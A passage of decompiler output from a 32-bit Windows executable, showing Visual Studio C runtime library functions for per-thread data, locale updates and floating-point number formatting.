// <lambda_6affb1475c98b40b75cdec977db92e3c>,class <lambda_b8d4b9c228a6ecc3f80208dbb4b4a104>&,class
// <lambda_608742c3c92a14382c1684fc64f96c88>>(class
// <lambda_6affb1475c98b40b75cdec977db92e3c>&&,class
// <lambda_b8d4b9c228a6ecc3f80208dbb4b4a104>&,class <lambda_608742c3c92a14382c1684fc64f96c88>&&)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void operator____(int *param_1,undefined4 *param_2)

{
  ___acrt_lock(*param_1);
  replace_current_thread_locale_nolock(*(__acrt_ptd **)*param_2,(__crt_locale_data *)0x0);
  FUN_00409ff9();
  return;
}



void FUN_00409ff9(void)

{
  int unaff_EBP;
  
  ___acrt_unlock(**(int **)(unaff_EBP + 0x10));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
// <lambda_15ade71b0218206bbe3333a0c9b79046>,class <lambda_da44e0f8b0f19ba52fefafb335991732>&,class
// <lambda_207f2d024fc103971653565357d6cd41>>(class
// <lambda_15ade71b0218206bbe3333a0c9b79046>&&,class
// <lambda_da44e0f8b0f19ba52fefafb335991732>&,class <lambda_207f2d024fc103971653565357d6cd41>&&)
//  public: void __thiscall __crt_seh_guarded_call<void>::operator()<class
// <lambda_9df27f884b057bc3edfc946cb5b7cf47>,class <lambda_e69574bed617af4e071282c136b37893>&,class
// <lambda_cc0d902bcbbeb830f749456577db4721>>(class
// <lambda_9df27f884b057bc3edfc946cb5b7cf47>&&,class
// <lambda_e69574bed617af4e071282c136b37893>&,class <lambda_cc0d902bcbbeb830f749456577db4721>&&)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void operator____(int *param_1,int **param_2)

{
  ___acrt_lock(*param_1);
  LOCK();
  **(int **)(**param_2 + 0x48) = **(int **)(**param_2 + 0x48) + 1;
  FUN_0040a041();
  return;
}



void FUN_0040a041(void)

{
  int unaff_EBP;
  
  ___acrt_unlock(**(int **)(unaff_EBP + 0x10));
  return;
}



// Library Function - Single Match
//  void __cdecl __acrt_lock_and_call<class <lambda_6250bd4b2a391816dd638c3bf72b0bcb>>(enum
// __acrt_lock_id,class <lambda_6250bd4b2a391816dd638c3bf72b0bcb>&&)
// 
// Library: Visual Studio 2015 Release

void __cdecl
__acrt_lock_and_call_class__lambda_6250bd4b2a391816dd638c3bf72b0bcb___
          (__acrt_lock_id param_1,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ *param_2)

{
  __acrt_lock_id local_10;
  __acrt_lock_id local_c;
  
  local_c = param_1;
  local_10 = param_1;
  operator____((int *)&local_10,(int **)param_2);
  return;
}



// Library Function - Single Match
//  void __cdecl __acrt_lock_and_call<class <lambda_b2ea41f6bbb362cd97d94c6828d90b61>>(enum
// __acrt_lock_id,class <lambda_b2ea41f6bbb362cd97d94c6828d90b61>&&)
// 
// Library: Visual Studio 2015 Release

void __cdecl
__acrt_lock_and_call_class__lambda_b2ea41f6bbb362cd97d94c6828d90b61___
          (__acrt_lock_id param_1,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ *param_2)

{
  __acrt_lock_id local_10;
  __acrt_lock_id local_c;
  
  local_c = param_1;
  local_10 = param_1;
  operator____((int *)&local_10,(undefined4 *)param_2);
  return;
}



// Library Function - Single Match
//  void __cdecl __acrt_lock_and_call<class <lambda_be2b3da3f62db62e9dad5dc70221a656>>(enum
// __acrt_lock_id,class <lambda_be2b3da3f62db62e9dad5dc70221a656>&&)
// 
// Library: Visual Studio 2015 Release

void __cdecl
__acrt_lock_and_call_class__lambda_be2b3da3f62db62e9dad5dc70221a656___
          (__acrt_lock_id param_1,_lambda_be2b3da3f62db62e9dad5dc70221a656_ *param_2)

{
  __acrt_lock_id local_10;
  __acrt_lock_id local_c;
  
  local_c = param_1;
  local_10 = param_1;
  operator____((int *)&local_10,(undefined4 *)param_2);
  return;
}



// Library Function - Single Match
//  void __cdecl __acrt_lock_and_call<class <lambda_e69574bed617af4e071282c136b37893>>(enum
// __acrt_lock_id,class <lambda_e69574bed617af4e071282c136b37893>&&)
// 
// Library: Visual Studio 2015 Release

void __cdecl
__acrt_lock_and_call_class__lambda_e69574bed617af4e071282c136b37893___
          (__acrt_lock_id param_1,_lambda_e69574bed617af4e071282c136b37893_ *param_2)

{
  __acrt_lock_id local_10;
  __acrt_lock_id local_c;
  
  local_c = param_1;
  local_10 = param_1;
  operator____((int *)&local_10,(int **)param_2);
  return;
}



// Library Function - Single Match
//  void __cdecl construct_ptd(struct __acrt_ptd * const,struct __crt_locale_data * * const)
// 
// Library: Visual Studio 2015 Release

void __cdecl construct_ptd(__acrt_ptd *param_1,__crt_locale_data **param_2)

{
  __acrt_ptd **local_c;
  __crt_locale_data ***local_8;
  
  *(undefined4 *)(param_1 + 0x18) = 1;
  *(undefined **)param_1 = &DAT_00414b48;
  *(undefined4 *)(param_1 + 0x350) = 1;
  *(undefined4 **)(param_1 + 0x48) = &DAT_0041b4f0;
  *(undefined2 *)(param_1 + 0x6c) = 0x43;
  *(undefined2 *)(param_1 + 0x172) = 0x43;
  *(undefined4 *)(param_1 + 0x34c) = 0;
  local_8 = (__crt_locale_data ***)&param_1;
  __acrt_lock_and_call_class__lambda_e69574bed617af4e071282c136b37893___
            (5,(_lambda_e69574bed617af4e071282c136b37893_ *)&local_8);
  local_c = &param_1;
  local_8 = &param_2;
  __acrt_lock_and_call_class__lambda_b2ea41f6bbb362cd97d94c6828d90b61___
            (4,(_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ *)&local_c);
  return;
}



// Library Function - Single Match
//  void __stdcall destroy_fls(void *)
// 
// Library: Visual Studio 2015 Release

void destroy_fls(void *param_1)

{
  if (param_1 != (void *)0x0) {
    destroy_ptd((__acrt_ptd *)param_1);
    FID_conflict__free(param_1);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl destroy_ptd(struct __acrt_ptd * const)
// 
// Library: Visual Studio 2015 Release

void __cdecl destroy_ptd(__acrt_ptd *param_1)

{
  __acrt_ptd **local_8;
  
  if (*(undefined **)param_1 != &DAT_00414b48) {
    FID_conflict__free(*(undefined **)param_1);
  }
  FID_conflict__free(*(void **)(param_1 + 0x3c));
  FID_conflict__free(*(void **)(param_1 + 0x30));
  FID_conflict__free(*(void **)(param_1 + 0x34));
  FID_conflict__free(*(void **)(param_1 + 0x38));
  FID_conflict__free(*(void **)(param_1 + 0x28));
  FID_conflict__free(*(void **)(param_1 + 0x2c));
  FID_conflict__free(*(void **)(param_1 + 0x40));
  FID_conflict__free(*(void **)(param_1 + 0x44));
  FID_conflict__free(*(void **)(param_1 + 0x360));
  local_8 = &param_1;
  __acrt_lock_and_call_class__lambda_6250bd4b2a391816dd638c3bf72b0bcb___
            (5,(_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ *)&local_8);
  local_8 = &param_1;
  __acrt_lock_and_call_class__lambda_be2b3da3f62db62e9dad5dc70221a656___
            (4,(_lambda_be2b3da3f62db62e9dad5dc70221a656_ *)&local_8);
  return;
}



// Library Function - Single Match
//  void __cdecl replace_current_thread_locale_nolock(struct __acrt_ptd * const,struct
// __crt_locale_data * const)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release

void __cdecl replace_current_thread_locale_nolock(__acrt_ptd *param_1,__crt_locale_data *param_2)

{
  undefined **ppuVar1;
  
  if (*(int *)(param_1 + 0x4c) != 0) {
    ___acrt_release_locale_ref(*(int *)(param_1 + 0x4c));
    ppuVar1 = *(undefined ***)(param_1 + 0x4c);
    if (((ppuVar1 != DAT_0041c1d8) && (ppuVar1 != &PTR_DAT_0041b130)) &&
       (ppuVar1[3] == (undefined *)0x0)) {
      ___acrt_free_locale(ppuVar1);
    }
  }
  *(__crt_locale_data **)(param_1 + 0x4c) = param_2;
  if (param_2 != (__crt_locale_data *)0x0) {
    ___acrt_add_locale_ref((int)param_2);
  }
  return;
}



// Library Function - Single Match
//  ___acrt_getptd
// 
// Library: Visual Studio 2015 Release

__acrt_ptd * ___acrt_getptd(void)

{
  code *pcVar1;
  DWORD dwErrCode;
  __acrt_ptd *p_Var2;
  int iVar3;
  
  dwErrCode = GetLastError();
  if ((DAT_0041b128 != 0xffffffff) &&
     (p_Var2 = (__acrt_ptd *)___acrt_FlsGetValue_4(DAT_0041b128), p_Var2 != (__acrt_ptd *)0x0)) {
LAB_0040a2e6:
    SetLastError(dwErrCode);
    return p_Var2;
  }
  p_Var2 = (__acrt_ptd *)__calloc_base(1,0x364);
  if ((p_Var2 == (__acrt_ptd *)0x0) ||
     (iVar3 = ___acrt_FlsSetValue_8(DAT_0041b128,p_Var2), iVar3 == 0)) {
    FID_conflict__free(p_Var2);
  }
  else {
    construct_ptd(p_Var2,(__crt_locale_data **)&DAT_0041c1d8);
    FID_conflict__free((void *)0x0);
    if (p_Var2 != (__acrt_ptd *)0x0) goto LAB_0040a2e6;
  }
  SetLastError(dwErrCode);
  _abort();
  pcVar1 = (code *)swi(3);
  p_Var2 = (__acrt_ptd *)(*pcVar1)();
  return p_Var2;
}



// Library Function - Single Match
//  ___acrt_getptd_noexit
// 
// Library: Visual Studio 2015 Release

__acrt_ptd * ___acrt_getptd_noexit(void)

{
  DWORD dwErrCode;
  __acrt_ptd *_Memory;
  int iVar1;
  
  dwErrCode = GetLastError();
  if ((DAT_0041b128 != 0xffffffff) &&
     (_Memory = (__acrt_ptd *)___acrt_FlsGetValue_4(DAT_0041b128), _Memory != (__acrt_ptd *)0x0)) {
LAB_0040a375:
    SetLastError(dwErrCode);
    return _Memory;
  }
  _Memory = (__acrt_ptd *)__calloc_base(1,0x364);
  if (_Memory == (__acrt_ptd *)0x0) {
    _Memory = (__acrt_ptd *)0x0;
  }
  else {
    iVar1 = ___acrt_FlsSetValue_8(DAT_0041b128,_Memory);
    if (iVar1 != 0) {
      construct_ptd(_Memory,(__crt_locale_data **)&DAT_0041c1d8);
      FID_conflict__free((void *)0x0);
      if (_Memory != (__acrt_ptd *)0x0) goto LAB_0040a375;
      goto LAB_0040a36c;
    }
  }
  FID_conflict__free(_Memory);
LAB_0040a36c:
  SetLastError(dwErrCode);
  return (__acrt_ptd *)0x0;
}



undefined4 FUN_0040a3b0(void)

{
  DWORD DVar1;
  
  DVar1 = DAT_0041b128;
  if (DAT_0041b128 != 0xffffffff) {
    DVar1 = ___acrt_FlsFree_4(DAT_0041b128);
    DAT_0041b128 = 0xffffffff;
  }
  return CONCAT31((int3)(DVar1 >> 8),1);
}



// Library Function - Single Match
//  ___acrt_update_locale_info
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_update_locale_info(int param_1,int *param_2)

{
  undefined **ppuVar1;
  
  if ((*param_2 != DAT_0041c1d8) && ((*(uint *)(param_1 + 0x350) & DAT_0041b770) == 0)) {
    ppuVar1 = ___acrt_update_thread_locale_data();
    *param_2 = (int)ppuVar1;
  }
  return;
}



// Library Function - Single Match
//  ___acrt_update_multibyte_info
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_update_multibyte_info(int param_1,int **param_2)

{
  int *piVar1;
  
  if ((*param_2 != (int *)PTR_DAT_0041b710) && ((*(uint *)(param_1 + 0x350) & DAT_0041b770) == 0)) {
    piVar1 = ___acrt_update_thread_multibyte_data();
    *param_2 = piVar1;
  }
  return;
}



// Library Function - Single Match
//  enum __acrt_fp_class __cdecl __acrt_fp_classify(double const &)
// 
// Library: Visual Studio 2015 Release

__acrt_fp_class __cdecl __acrt_fp_classify(double *param_1)

{
  uint uVar1;
  __acrt_fp_class _Stack20;
  
  uVar1 = *(uint *)((int)param_1 + 4);
  if ((uVar1 >> 0x14 & 0x7ff) == 0x7ff) {
    if ((*(uint *)param_1 | uVar1 & 0xfffff) == 0) {
      _Stack20 = 1;
    }
    else if ((((uVar1 & 0x80000000) == 0) || (*(uint *)param_1 != 0)) ||
            ((uVar1 & 0xfffff) != 0x80000)) {
      if ((uVar1 & 0x80000) == 0) {
        _Stack20 = 3;
      }
      else {
        _Stack20 = 2;
      }
    }
    else {
      _Stack20 = 4;
    }
  }
  else {
    _Stack20 = 0;
  }
  return _Stack20;
}



// Library Function - Single Match
//  bool __cdecl __acrt_fp_is_negative(double const &)
// 
// Library: Visual Studio 2015 Release

bool __cdecl __acrt_fp_is_negative(double *param_1)

{
  return (*(uint *)((int)param_1 + 4) & 0x80000000) != 0;
}



// Library Function - Single Match
//  int __cdecl fp_format_a(double const * const,char *,unsigned int,char * const,unsigned
// int,int,bool,unsigned int,struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
fp_format_a(double *param_1,char *param_2,uint param_3,char *param_4,uint param_5,int param_6,
           bool param_7,uint param_8,__crt_locale_pointers *param_9)

{
  int *piVar1;
  char *pcVar2;
  uint uVar3;
  char *pcVar4;
  uint uVar5;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar6;
  char *pcVar7;
  int iVar8;
  bool bVar9;
  ulonglong uVar10;
  undefined8 uVar11;
  int local_34;
  int local_30;
  char local_28;
  undefined4 local_24;
  int local_20;
  char *local_1c;
  uint local_14;
  uint local_10;
  int local_c;
  uint local_8;
  
  if (param_6 < 0) {
    param_6 = 0;
  }
  *param_2 = '\0';
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_34,param_9);
  if (param_3 <= param_6 + 0xbU) {
    piVar1 = __errno();
    iVar8 = 0x22;
    *piVar1 = 0x22;
    FUN_004091be();
    goto LAB_0040a798;
  }
  local_24 = *(undefined4 *)param_1;
  if ((*(uint *)((int)param_1 + 4) >> 0x14 & 0x7ff) == 0x7ff) {
    iVar8 = fp_format_e(param_1,param_2,param_3,param_4,param_5,param_6,false,param_8,
                        (__crt_locale_pointers *)0x0);
    if (iVar8 == 0) {
      pcVar2 = _strrchr(param_2,0x65);
      if (pcVar2 != (char *)0x0) {
        *pcVar2 = ((param_7 == false) - 1U & 0xe0) + 0x70;
        pcVar2[3] = '\0';
      }
      iVar8 = 0;
    }
    else {
      *param_2 = '\0';
    }
    goto LAB_0040a798;
  }
  if ((*(uint *)((int)param_1 + 4) & 0x80000000) != 0) {
    *param_2 = '-';
    param_2 = param_2 + 1;
  }
  local_10 = 0x3ff;
  iVar8 = ((param_7 == false) - 1 & 0xffffffe0) + 0x27;
  if ((*(uint *)((int)param_1 + 4) & 0x7ff00000) == 0) {
    *param_2 = '0';
    if ((*(uint *)param_1 | *(uint *)((int)param_1 + 4) & 0xfffff) == 0) {
      local_10 = 0;
    }
    else {
      local_10 = 0x3fe;
    }
  }
  else {
    *param_2 = '1';
  }
  local_1c = param_2 + 1;
  pcVar2 = param_2 + 2;
  if (param_6 == 0) {
    *local_1c = '\0';
  }
  else {
    *local_1c = ***(char ***)(local_30 + 0x88);
  }
  local_14 = *(uint *)((int)param_1 + 4) & 0xfffff;
  local_20 = iVar8;
  if ((local_14 != 0) || (*(int *)param_1 != 0)) {
    local_8 = 0;
    local_c = 0x30;
    local_14 = 0xf0000;
    do {
      if (param_6 < 1) break;
      uVar10 = __aullshr((byte)local_c,*(uint *)((int)param_1 + 4) & local_14 & 0xfffff);
      uVar3 = (uint)(ushort)((short)uVar10 + 0x30);
      if (0x39 < uVar3) {
        uVar3 = uVar3 + iVar8;
      }
      *pcVar2 = (char)uVar3;
      pcVar2 = pcVar2 + 1;
      local_8 = local_8 >> 4 | local_14 << 0x1c;
      local_14 = local_14 >> 4;
      local_c = local_c + -4;
      param_6 = param_6 - 1;
    } while (-1 < (short)local_c);
    if ((-1 < (short)local_c) &&
       (uVar10 = __aullshr((byte)local_c,*(uint *)((int)param_1 + 4) & local_14 & 0xfffff),
       pcVar7 = pcVar2, 8 < (ushort)uVar10)) {
      while( true ) {
        pcVar4 = pcVar7 + -1;
        if ((*pcVar4 != 'f') && (*pcVar4 != 'F')) break;
        *pcVar4 = '0';
        pcVar7 = pcVar4;
      }
      if (pcVar4 == local_1c) {
        pcVar7[-2] = pcVar7[-2] + '\x01';
      }
      else if (*pcVar4 == '9') {
        *pcVar4 = (char)local_20 + ':';
      }
      else {
        *pcVar4 = *pcVar4 + '\x01';
      }
    }
  }
  if (0 < param_6) {
    _memset(pcVar2,0x30,param_6);
    pcVar2 = pcVar2 + param_6;
  }
  if (*local_1c == '\0') {
    pcVar2 = local_1c;
  }
  *pcVar2 = ((param_7 == false) - 1U & 0xe0) + 0x70;
  uVar10 = __aullshr(0x34,*(uint *)((int)param_1 + 4));
  uVar3 = (uint)uVar10 & 0x7ff;
  uVar5 = uVar3 - local_10;
  uVar3 = (uint)(uVar3 < local_10);
  uVar6 = -uVar3;
  if (uVar3 == 0) {
    pcVar2[1] = '+';
  }
  else {
    pcVar2[1] = '-';
    bVar9 = uVar5 != 0;
    uVar5 = -uVar5;
    uVar6 = -(uVar6 + bVar9);
  }
  pcVar4 = pcVar2 + 2;
  *pcVar4 = '0';
  pcVar7 = pcVar4;
  if (-1 < (int)uVar6) {
    if (((int)uVar6 < 1) && (uVar5 < 1000)) {
LAB_0040a74b:
      if (((int)uVar6 < 0) || (((int)uVar6 < 1 && (uVar5 < 100)))) goto LAB_0040a769;
    }
    else {
      uVar11 = __alldvrm(uVar5,uVar6,1000,0);
      local_20 = (int)((ulonglong)uVar11 >> 0x20);
      *pcVar4 = (char)uVar11 + '0';
      pcVar7 = pcVar2 + 3;
      uVar5 = extraout_ECX;
      if (pcVar7 == pcVar4) goto LAB_0040a74b;
    }
    uVar11 = __alldvrm(uVar5,uVar6,100,0);
    local_20 = (int)((ulonglong)uVar11 >> 0x20);
    *pcVar7 = (char)uVar11 + '0';
    pcVar7 = pcVar7 + 1;
    uVar5 = extraout_ECX_00;
  }
LAB_0040a769:
  if ((pcVar7 != pcVar4) || ((-1 < (int)uVar6 && ((0 < (int)uVar6 || (9 < uVar5)))))) {
    uVar11 = __alldvrm(uVar5,uVar6,10,0);
    *pcVar7 = (char)uVar11 + '0';
    pcVar7 = pcVar7 + 1;
    uVar5 = extraout_ECX_01;
  }
  iVar8 = 0;
  *pcVar7 = (char)uVar5 + '0';
  pcVar7[1] = '\0';
LAB_0040a798:
  if (local_28 != '\0') {
    *(uint *)(local_34 + 0x350) = *(uint *)(local_34 + 0x350) & 0xfffffffd;
  }
  return iVar8;
}



// Library Function - Single Match
//  int __cdecl fp_format_e(double const * const,char * const,unsigned int,char * const,unsigned
// int,int,bool,unsigned int,struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
fp_format_e(double *param_1,char *param_2,uint param_3,char *param_4,uint param_5,int param_6,
           bool param_7,uint param_8,__crt_locale_pointers *param_9)

{
  int iVar1;
  uint uVar2;
  int local_10 [3];
  
  ___acrt_fltout(*(uint *)param_1,*(uint *)((int)param_1 + 4),param_6 + 1,local_10,param_4,param_5);
  uVar2 = 0xffffffff;
  if (param_3 != 0xffffffff) {
    uVar2 = (param_3 - (local_10[0] == 0x2d)) - (uint)(0 < param_6);
  }
  iVar1 = ___acrt_fp_strflt_to_string
                    (param_2 + (uint)(0 < param_6) + (uint)(local_10[0] == 0x2d),uVar2,param_6 + 1,
                     (int)local_10);
  if (iVar1 == 0) {
    iVar1 = fp_format_e_internal
                      (param_2,param_3,param_6,param_7,param_8,(_strflt *)local_10,false,param_9);
  }
  else {
    *param_2 = '\0';
  }
  return iVar1;
}



// Library Function - Single Match
//  int __cdecl fp_format_e_internal(char * const,unsigned int,int,bool,unsigned int,struct _strflt
// * const,bool,struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
fp_format_e_internal
          (char *param_1,uint param_2,int param_3,bool param_4,uint param_5,_strflt *param_6,
          bool param_7,__crt_locale_pointers *param_8)

{
  code *pcVar1;
  int *piVar2;
  char *_SizeInBytes;
  errno_t eVar3;
  int iVar4;
  int iVar5;
  char *pcVar6;
  int local_14;
  int local_10;
  char local_8;
  
  iVar5 = param_3;
  if (param_3 < 1) {
    iVar5 = 0;
  }
  if (iVar5 + 9U < param_2) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,param_8);
    if (param_7 != false) {
      shift_bytes(param_1,param_2,param_1 + (*(int *)param_6 == 0x2d),(uint)(0 < param_3));
    }
    pcVar6 = param_1;
    if (*(int *)param_6 == 0x2d) {
      *param_1 = '-';
      pcVar6 = param_1 + 1;
    }
    if (0 < param_3) {
      *pcVar6 = pcVar6[1];
      pcVar6 = pcVar6 + 1;
      *pcVar6 = ***(char ***)(local_10 + 0x88);
    }
    pcVar6 = pcVar6 + (uint)(param_7 == false) + param_3;
    _SizeInBytes = (char *)0xffffffff;
    if (param_2 != 0xffffffff) {
      _SizeInBytes = param_1 + (param_2 - (int)pcVar6);
    }
    eVar3 = _strcpy_s(pcVar6,(rsize_t)_SizeInBytes,"e+000");
    if (eVar3 != 0) {
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      pcVar1 = (code *)swi(3);
      iVar5 = (*pcVar1)();
      return iVar5;
    }
    if (param_4 != false) {
      *pcVar6 = 'E';
    }
    if (**(char **)(param_6 + 8) != '0') {
      iVar5 = *(int *)(param_6 + 4) + -1;
      if (iVar5 < 0) {
        iVar5 = -iVar5;
        pcVar6[1] = '-';
      }
      if (99 < iVar5) {
        iVar4 = iVar5 / 100;
        iVar5 = iVar5 % 100;
        pcVar6[2] = pcVar6[2] + (char)iVar4;
      }
      if (9 < iVar5) {
        iVar4 = iVar5 / 10;
        iVar5 = iVar5 % 10;
        pcVar6[3] = pcVar6[3] + (char)iVar4;
      }
      pcVar6[4] = pcVar6[4] + (char)iVar5;
    }
    if ((param_5 == 2) && (pcVar6[2] == '0')) {
      FID_conflict__memcpy(pcVar6 + 2,pcVar6 + 3,3);
    }
    if (local_8 != '\0') {
      *(uint *)(local_14 + 0x350) = *(uint *)(local_14 + 0x350) & 0xfffffffd;
    }
    iVar5 = 0;
  }
  else {
    piVar2 = __errno();
    iVar5 = 0x22;
    *piVar2 = 0x22;
    FUN_004091be();
  }
  return iVar5;
}



// Library Function - Single Match
//  int __cdecl fp_format_f(double const * const,char * const,unsigned int,char * const,unsigned
// int,int,struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
fp_format_f(double *param_1,char *param_2,uint param_3,char *param_4,uint param_5,int param_6,
           __crt_locale_pointers *param_7)

{
  int iVar1;
  uint uVar2;
  int local_10;
  int local_c;
  undefined4 uStack8;
  
  local_10 = 0;
  local_c = 0;
  uStack8 = 0;
  ___acrt_fltout(*(uint *)param_1,*(uint *)((int)param_1 + 4),param_6,&local_10,param_4,param_5);
  uVar2 = 0xffffffff;
  if (param_3 != 0xffffffff) {
    uVar2 = param_3 - (local_10 == 0x2d);
  }
  iVar1 = ___acrt_fp_strflt_to_string
                    (param_2 + (local_10 == 0x2d),uVar2,local_c + param_6,(int)&local_10);
  if (iVar1 == 0) {
    iVar1 = fp_format_f_internal(param_2,param_3,param_6,(_strflt *)&local_10,false,param_7);
  }
  else {
    *param_2 = '\0';
  }
  return iVar1;
}



// Library Function - Single Match
//  int __cdecl fp_format_f_internal(char * const,unsigned int,int,struct _strflt *
// const,bool,struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
fp_format_f_internal
          (char *param_1,uint param_2,int param_3,_strflt *param_4,bool param_5,
          __crt_locale_pointers *param_6)

{
  int iVar1;
  char *pcVar2;
  int local_14;
  int local_10;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,param_6);
  if ((param_5 != false) && (*(int *)(param_4 + 4) + -1 == param_3)) {
    *(undefined2 *)(param_1 + (uint)(*(int *)param_4 == 0x2d) + *(int *)(param_4 + 4) + -1) = 0x30;
  }
  pcVar2 = param_1;
  if (*(int *)param_4 == 0x2d) {
    *param_1 = '-';
    pcVar2 = param_1 + 1;
  }
  if (*(int *)(param_4 + 4) < 1) {
    shift_bytes(param_1,param_2,pcVar2,1);
    *pcVar2 = '0';
    pcVar2 = pcVar2 + 1;
  }
  else {
    pcVar2 = pcVar2 + *(int *)(param_4 + 4);
  }
  if (0 < param_3) {
    shift_bytes(param_1,param_2,pcVar2,1);
    *pcVar2 = ***(char ***)(local_10 + 0x88);
    iVar1 = *(int *)(param_4 + 4);
    if (iVar1 < 0) {
      if ((param_5 != false) || (-iVar1 < param_3)) {
        param_3 = -iVar1;
      }
      shift_bytes(param_1,param_2,pcVar2 + 1,param_3);
      _memset(pcVar2 + 1,0x30,param_3);
    }
  }
  if (local_8 != '\0') {
    *(uint *)(local_14 + 0x350) = *(uint *)(local_14 + 0x350) & 0xfffffffd;
  }
  return 0;
}



// Library Function - Single Match
//  int __cdecl fp_format_g(double const * const,char * const,unsigned int,char * const,unsigned
// int,int,bool,unsigned int,struct __crt_locale_pointers * const)
// 
// Library: Visual Studio 2015 Release

int __cdecl
fp_format_g(double *param_1,char *param_2,uint param_3,char *param_4,uint param_5,int param_6,
           bool param_7,uint param_8,__crt_locale_pointers *param_9)

{
  char *pcVar1;
  uint uVar2;
  int iVar3;
  char *pcVar4;
  bool bVar5;
  int local_14;
  int local_10;
  undefined4 uStack12;
  int local_8;
  
  local_14 = 0;
  local_10 = 0;
  uStack12 = 0;
  ___acrt_fltout(*(uint *)param_1,*(uint *)((int)param_1 + 4),param_6,&local_14,param_4,param_5);
  bVar5 = local_14 == 0x2d;
  local_8 = local_10 + -1;
  uVar2 = 0xffffffff;
  if (param_3 != 0xffffffff) {
    uVar2 = param_3 - bVar5;
  }
  iVar3 = ___acrt_fp_strflt_to_string(param_2 + bVar5,uVar2,param_6,(int)&local_14);
  if (iVar3 == 0) {
    iVar3 = local_10 + -1;
    if ((iVar3 < -4) || (param_6 <= iVar3)) {
      iVar3 = fp_format_e_internal
                        (param_2,param_3,param_6,param_7,param_8,(_strflt *)&local_14,true,param_9);
    }
    else {
      pcVar1 = param_2 + bVar5;
      if (local_8 < iVar3) {
        do {
          pcVar4 = pcVar1;
          pcVar1 = pcVar4 + 1;
        } while (*pcVar4 != '\0');
        pcVar4[-1] = '\0';
      }
      iVar3 = fp_format_f_internal(param_2,param_3,param_6,(_strflt *)&local_14,true,param_9);
    }
  }
  else {
    *param_2 = '\0';
  }
  return iVar3;
}



// Library Function - Single Match
//  int __cdecl fp_format_nan_or_infinity(enum __acrt_fp_class,bool,char *,unsigned int,bool)
// 
// Library: Visual Studio 2015 Release

int __cdecl
fp_format_nan_or_infinity
          (__acrt_fp_class param_1,bool param_2,char *param_3,uint param_4,bool param_5)

{
  char cVar1;
  code *pcVar2;
  int iVar3;
  errno_t eVar4;
  uint extraout_EDX;
  uint uVar5;
  char *pcVar6;
  undefined in_stack_ffffffb4;
  char *pcVar7;
  char *local_48 [4];
  undefined *local_38;
  undefined *local_34;
  undefined *local_30;
  undefined *local_2c;
  char *local_28;
  undefined *local_24;
  char *local_20;
  undefined *local_1c;
  char *local_18;
  undefined *local_14;
  char *local_10;
  undefined *local_c;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  if (param_4 < param_2 + 4) {
    *param_3 = '\0';
  }
  else {
    if (param_2 != false) {
      *param_3 = '-';
      param_3 = param_3 + 1;
      param_4 = param_4 - 1;
      *param_3 = '\0';
    }
    local_28 = "NAN(SNAN)";
    local_48[0] = "INF";
    local_48[1] = &DAT_004152e0;
    local_48[2] = &DAT_004152e4;
    local_48[3] = &DAT_004152e4;
    local_20 = "nan(snan)";
    local_30 = &DAT_004152ec;
    uVar5 = (param_5 != false) - 1 & 2;
    local_2c = &DAT_004152ec;
    local_1c = &DAT_004152ec;
    local_c = &DAT_004152ec;
    local_18 = "NAN(IND)";
    local_38 = &DAT_004152e8;
    local_34 = &DAT_004152e8;
    local_24 = &DAT_004152e8;
    local_14 = &DAT_004152e8;
    local_10 = "nan(ind)";
    pcVar6 = local_48[param_1 * 4 + -4 + uVar5];
    pcVar7 = pcVar6 + 1;
    do {
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    eVar4 = _strcpy_s(param_3,param_4,
                      local_48[((param_1 * 4 + -3) -
                               (uint)((uint)((int)pcVar6 - (int)pcVar7) < param_4)) + uVar5]);
    in_stack_ffffffb4 = SUB41(pcVar7,0);
    param_4 = extraout_EDX;
    if (eVar4 != 0) {
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      pcVar2 = (code *)swi(3);
      iVar3 = (*pcVar2)();
      return iVar3;
    }
  }
  iVar3 = FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,(char)param_4,in_stack_ffffffb4);
  return iVar3;
}



// Library Function - Single Match
//  void __cdecl shift_bytes(char * const,unsigned int,char * const,int)
// 
// Library: Visual Studio 2015 Release

void __cdecl shift_bytes(char *param_1,uint param_2,char *param_3,int param_4)

{
  char cVar1;
  char *pcVar2;
  
  if (param_4 != 0) {
    pcVar2 = param_3;
    do {
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    FID_conflict__memcpy(param_3 + param_4,param_3,(size_t)(pcVar2 + (1 - (int)(param_3 + 1))));
  }
  return;
}



// Library Function - Single Match
//  ___acrt_fp_format
// 
// Library: Visual Studio 2015 Release

int __cdecl
___acrt_fp_format(double *param_1,char *param_2,uint param_3,char *param_4,uint param_5,int param_6,
                 int param_7,uint param_8,undefined4 param_9,__crt_locale_pointers *param_10)

{
  bool bVar1;
  int *piVar2;
  __acrt_fp_class _Var3;
